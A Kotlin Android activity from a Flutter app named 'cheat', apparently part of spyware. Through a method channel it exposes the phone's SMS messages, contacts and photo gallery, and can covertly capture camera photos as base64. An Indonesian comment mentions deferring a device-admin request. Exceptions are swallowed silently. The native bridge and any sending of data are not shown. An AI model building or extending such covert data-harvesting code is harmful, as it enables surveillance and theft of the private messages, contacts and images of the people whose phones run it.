package com.yanz.cheat

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {
    private val CHANNEL = "yanz/cheat"
    private lateinit var bridge: NativeBridge

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        bridge = NativeBridge(this)

        // JANGAN MINTA DEVICE ADMIN DI SINI, BISA BIKIN FORCE CLOSE

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                try {
                    when (call.method) {
                        "getSms" -> result.success(bridge.getSms())
                        "getContacts" -> result.success(bridge.getContacts())
                        "getGallery" -> result.success(bridge.getGallery())
                        "capturePhoto" -> {
                            val front = call.argument<Boolean>("front") ?: false
                            bridge.capturePhoto(front) { b64 -> 
                                runOnUiThread { result.success(b64) } 
                            }
                        }
                        else -> result.notImplemented()
                    }
                } catch (e: Exception) {
                    result.success(if (call.method == "capturePhoto") "" else emptyList<Map<String, String>>())
                }
            }
    }
}
